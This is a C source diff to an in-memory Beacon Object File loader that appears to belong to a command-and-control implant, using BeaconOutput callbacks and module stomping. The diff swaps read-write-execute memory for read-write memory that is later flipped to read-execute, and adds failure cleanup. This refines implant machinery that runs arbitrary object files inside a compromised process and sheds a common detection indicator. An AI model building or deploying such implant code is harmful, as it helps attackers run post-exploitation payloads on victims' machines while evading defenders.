@@ -139,6 +139,8 @@ static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
 /* ========= [ section allocation ] ========= */
 
 #define BOF_ALLOC_FLAGS (MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN)
+/* COFF section flag: executable (IMAGE_SCN_MEM_EXECUTE) */
+#define BOF_SCN_MEM_EXECUTE 0x20000000
 
 static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
                                  PCOF_HEADER hdr, PCOF_SECTION sections,
@@ -169,7 +171,9 @@ static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
 
         PVOID  base  = NULL;
         SIZE_T alloc = (SIZE_T)need + 16;
-        NTSTATUS st  = Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &base, 0, &alloc, BOF_ALLOC_FLAGS, PAGE_EXECUTE_READWRITE );
+        /* RW alloc; sections are copied/relocated while RW and flipped to RX
+         * in the final-protection step.  Never PAGE_EXECUTE_READWRITE. */
+        NTSTATUS st  = Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &base, 0, &alloc, BOF_ALLOC_FLAGS, PAGE_READWRITE );
 
         NaxDbg( Nax, "[bof] sec[%d] '%.8s' alloc raw=%u virt=%u -> %p (st=0x%x)",
                 (INT)i, s->Name, raw_size, virt_size, base, (UINT32)st );
@@ -192,8 +196,19 @@ static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
 
     PVOID  mf  = NULL;
     SIZE_T mfs = 4096;
-    Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &mf, 0, &mfs, BOF_ALLOC_FLAGS, PAGE_EXECUTE_READWRITE );
-    if ( mf ) MmZero( mf, mfs );
+    /* mapFunctions is a data table (relocation targets), never executed - RW. */
+    NTSTATUS st = Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &mf, 0, &mfs, BOF_ALLOC_FLAGS, PAGE_READWRITE );
+    if ( !NT_SUCCESS( st ) || ! mf ) {
+        for ( UINT16 j = 0; j < BOF_MAX_SECTIONS; j++ ) {
+            if ( mapSections[j] ) {
+                SIZE_T sz = 0; PVOID b = mapSections[j];
+                Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &sz, MEM_RELEASE );
+                mapSections[j] = NULL;
+            }
+        }
+        return NAX_ERR_FAIL;
+    }
+    MmZero( mf, mfs );
     *mf_out = mf;
     NaxDbg( Nax, "[bof] mapFunctions=%p (dist from .text: 0x%llx)",
             mf, mf ? (unsigned long long)((ULONG_PTR)mf - (ULONG_PTR)mapSections[0]) : 0 );
@@ -457,14 +472,24 @@ FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
         NaxBofStompProtect( Nax, mapSections, hdr->NumberOfSections, sections );
         NaxDbg( Nax, "[bof] step 3b: stomp protections OK (.text=RX, rest=RW)" );
     } else {
-        NaxDbg( Nax, "[bof] step 3b: set PAGE_EXECUTE_READWRITE on all sections" );
+        /* Exec sections RX, data stays RW - no RWX anywhere */
+        NaxDbg( Nax, "[bof] step 3b: section protections (exec=RX, data=RW)" );
         for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
             if ( !mapSections[i] ) continue;
+            if ( !( sections[i].Characteristics & BOF_SCN_MEM_EXECUTE ) ) continue;
             PVOID    base = mapSections[i];
             SIZE_T   sz   = (SIZE_T)( sections[i].SizeOfRawData + 16 );
             ULONG    old  = 0;
-            NTSTATUS st   = Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old );
-            NaxDbg( Nax, "[bof] sec[%d] '%.8s' RWX st=0x%x", (INT)i, sections[i].Name, (UINT32)st );
+            NTSTATUS st   = Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz, PAGE_EXECUTE_READ, &old );
+            if ( !NT_SUCCESS( st ) ) {
+                NaxDbg( Nax, "[bof] sec[%d] '%.8s' RX FAILED st=0x%x", (INT)i, sections[i].Name, (UINT32)st );
+                if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );
+                NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
+                if ( mf_base ) { SIZE_T z=0; PVOID b=mf_base; Nax->Ntdll.NtFreeVirtualMemory(NtCurrentProcess(),&b,&z,MEM_RELEASE); }
+                BeaconOutput( CALLBACK_ERROR, "alloc", 5 );
+                return NAX_ERR_FAIL;
+            }
+            NaxDbg( Nax, "[bof] sec[%d] '%.8s' RX st=0x%x", (INT)i, sections[i].Name, (UINT32)st );
         }
         NaxDbg( Nax, "[bof] step 3b: protections OK" );
     }
@@ -641,13 +666,23 @@ FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
     if ( stomped ) {
         NaxBofStompProtect( Nax, mapSections, hdr->NumberOfSections, sections );
     } else {
+        /* Exec sections RX, data stays RW - no RWX anywhere */
         for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
             if ( !mapSections[i] ) continue;
+            if ( !( sections[i].Characteristics & BOF_SCN_MEM_EXECUTE ) ) continue;
             PVOID    base = mapSections[i];
             SIZE_T   sz   = (SIZE_T)( sections[i].SizeOfRawData + 16 );
             ULONG    old  = 0;
-            Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz,
-                                                PAGE_EXECUTE_READWRITE, &old );
+            NTSTATUS st   = Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz,
+                                                PAGE_EXECUTE_READ, &old );
+            if ( !NT_SUCCESS( st ) ) {
+                NaxDbg( Nax, "[bof-resident] sec[%d] RX FAILED st=0x%x", (INT)i, (UINT32)st );
+                if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );
+                NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
+                if ( mf_base ) { SIZE_T z=0; PVOID b=mf_base; Nax->Ntdll.NtFreeVirtualMemory(NtCurrentProcess(),&b,&z,MEM_RELEASE); }
+                Nax->BofStompPool.SmStompReq = FALSE;
+                return NULL;
+            }
         }
     }
 
